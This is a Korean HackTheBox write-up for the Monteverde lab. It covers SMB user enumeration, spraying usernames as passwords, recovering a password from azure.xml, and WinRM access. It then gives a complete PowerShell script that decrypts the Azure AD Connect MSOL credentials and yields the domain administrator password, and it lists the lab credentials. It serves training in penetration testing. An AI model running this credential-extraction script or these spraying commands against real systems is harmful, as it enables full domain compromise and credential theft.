# Monteverde - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49667,49673,49674,49676,49696,53,593,5985,636,88,9389 -sC -sV -vv -oA Monteverde 10.129.228.111
```
<img width="1103" height="469" alt="image" src="https://github.com/user-attachments/assets/0d961b30-5638-4d60-a6dd-2fe306b84f76" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `megabank.local` 추가.
<img width="1103" height="63" alt="image" src="https://github.com/user-attachments/assets/42d2cc50-5e0a-428b-8f1c-0ce484c04401" />

---
## SMB
- anonymous 로그인이 되지 않아서 `nxc`로 유저 목록 수집 시도.
```bash
nxc smb 10.129.228.111 --users
```
<img width="1103" height="389" alt="image" src="https://github.com/user-attachments/assets/0952d26a-a3f2-4882-81b2-8fb637b3cba8" />

<br>
<br>

- 유저 리스트 생성.
<img width="1103" height="245" alt="image" src="https://github.com/user-attachments/assets/832dd048-005e-477b-99c2-6c6bf54aee47" />

<br>
<br>

- 비밀번호를 발견하지는 못하여 유저 목록과 동일한 목록으로 로그인 시도.
```bash
nxc smb 10.129.228.111 -u users -p users --no-brute
```
<img width="1103" height="203" alt="image" src="https://github.com/user-attachments/assets/fb0fd3d5-efe6-4024-8fc2-9b1f63e82310" />

<br>
<br>

- SMB 정보 수집.
- `azure.xml` 발견.
```bash
smbmap -u SABatchJobs -p SABatchJobs -H 10.129.228.111 -r --depth=10
```
<img width="1103" height="82" alt="image" src="https://github.com/user-attachments/assets/daf0bdab-e439-4d93-8c56-30a496acb5af" />

<br>
<br>

- 비밀번호 발견.
```bash
smbmap -u SABatchJobs -p SABatchJobs -H 10.129.228.111 --download './users$//mhope/azure.xml'
```
<img width="1103" height="340" alt="image" src="https://github.com/user-attachments/assets/337c8f26-763b-4390-932a-deb72a343810" />

<br>
<br>

- 이전에 수집한 유저 리스트에서 비밀번호로 로그인 시도.
```bash
nxc smb 10.129.228.111 -u users -p '4n0therD4y@n0th3r$'
```
<img width="1103" height="182" alt="image" src="https://github.com/user-attachments/assets/1e8d7fe9-e9e7-440b-8688-46392e1fecfa" />

<br>
<br>

- `WINRM` 접속 시도.
```bash
nxc winrm 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```
<img width="1103" height="169" alt="image" src="https://github.com/user-attachments/assets/11601c22-e219-42f6-a8f3-f1b23ba34986" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```
<img width="1103" height="275" alt="image" src="https://github.com/user-attachments/assets/a43dbe0e-9e19-4953-b77f-10b05975f2a3" />

---
## Privesc
- `Azure Admins` 그룹에 속해 있음.
```powershell
whoami /all
```
<img width="1103" height="507" alt="image" src="https://github.com/user-attachments/assets/10026149-1734-4972-9812-c88520b4427a" />

<br>
<br>

- AD 환경에서 `AZURE`서비스를 이용하고 있어서 `Azure AD Connect` 권한상승을 시도.
- `AD Sync`서비스 확인.
```powershell
Get-Service -Name "ADSync" -ErrorAction SilentlyContinue
```
<img width="1103" height="111" alt="image" src="https://github.com/user-attachments/assets/83d016b8-95a8-420d-8929-18469217b28b" />

<br>
<br>

- `MSOL` 계정 추출 스크립트.
```powershell
# ========================================
# Azure AD Connect MSOL 계정 추출 스크립트
# ========================================

# 환경 자동 탐지 및 연결
function Get-ADSyncConnection {
    # 1. LocalDB 먼저 시도
    try {
        Write-Host "[*] Trying LocalDB connection..." -ForegroundColor Yellow
        $localDBConn = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
        $testClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $localDBConn
        $testClient.Open()
        $testClient.Close()
        Write-Host "[+] LocalDB found!" -ForegroundColor Green
        return $localDBConn
    } catch {
        Write-Host "[-] LocalDB not available" -ForegroundColor Red
    }

    # 2. 전체 SQL Server 시도
    try {
        Write-Host "[*] Trying full SQL Server connection..." -ForegroundColor Yellow
        $sqlServerConn = "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
        $testClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $sqlServerConn
        $testClient.Open()
        $testClient.Close()
        Write-Host "[+] SQL Server found!" -ForegroundColor Green
        return $sqlServerConn
    } catch {
        Write-Host "[-] SQL Server not available" -ForegroundColor Red
    }

    throw "No SQL connection available"
}

# 메인 실행
try {
    # 자동으로 적절한 연결 문자열 선택
    $connectionString = Get-ADSyncConnection
    
    Write-Host "`n[*] Connecting to database..." -ForegroundColor Yellow
    $client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString
    $client.Open()
    
    # 키 정보 추출
    Write-Host "[*] Extracting encryption keys..." -ForegroundColor Yellow
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $key_id = $reader.GetInt32(0)
    $instance_id = $reader.GetGuid(1)
    $entropy = $reader.GetGuid(2)
    $reader.Close()
    
    # 암호화된 설정 추출
    Write-Host "[*] Extracting encrypted configuration..." -ForegroundColor Yellow
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    
    if (-not $reader.Read()) {
        throw "No AD management agent found"
    }
    
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    $client.Close()
    
    # mcrypt.dll 로드 및 복호화
    Write-Host "[*] Decrypting password..." -ForegroundColor Yellow
    $mcryptPath = 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    
    if (-not (Test-Path $mcryptPath)) {
        throw "mcrypt.dll not found at $mcryptPath"
    }
    
    Add-Type -Path $mcryptPath
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    
    # 자격증명 파싱
    Write-Host "[*] Parsing credentials..." -ForegroundColor Yellow
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | 
              select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | 
                select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | 
                select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
    
    # 결과 출력
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "MSOL Account Credentials" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ("Domain:   " + $domain.Domain) -ForegroundColor Green
    Write-Host ("Username: " + $username.Username) -ForegroundColor Green
    Write-Host ("Password: " + $password.Password) -ForegroundColor Green
    Write-Host "========================================`n" -ForegroundColor Cyan
    
} catch {
    Write-Host "`n[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Red
} finally {
    if ($client -and $client.State -eq 'Open') {
        $client.Close()
    }
}
```

<br>

- 스크립트 실행하여 `administrator` 비밀번호 획득.
```powershell
. .\ex.ps1
```
<img width="1103" height="374" alt="image" src="https://github.com/user-attachments/assets/4b57f553-3d89-4ce6-a02d-47ad59edca4f" />

<br>
<br>

- `administrator:d0m@in4dminyeah!` `WINRM` 접속.
```bash
evil-winrm -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'
```
<img width="1103" height="274" alt="image" src="https://github.com/user-attachments/assets/c4092348-f1c3-4b2b-b17a-ac139cbf6ced" />

---
## FLAG
- `c:\users\mhope\desktop\user.txt`
<img width="1103" height="184" alt="image" src="https://github.com/user-attachments/assets/694403dd-bc34-4685-8921-65ec4c9a19df" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1103" height="184" alt="image" src="https://github.com/user-attachments/assets/b5366b2b-8578-4539-8bc4-a9f72d3f3a86" />
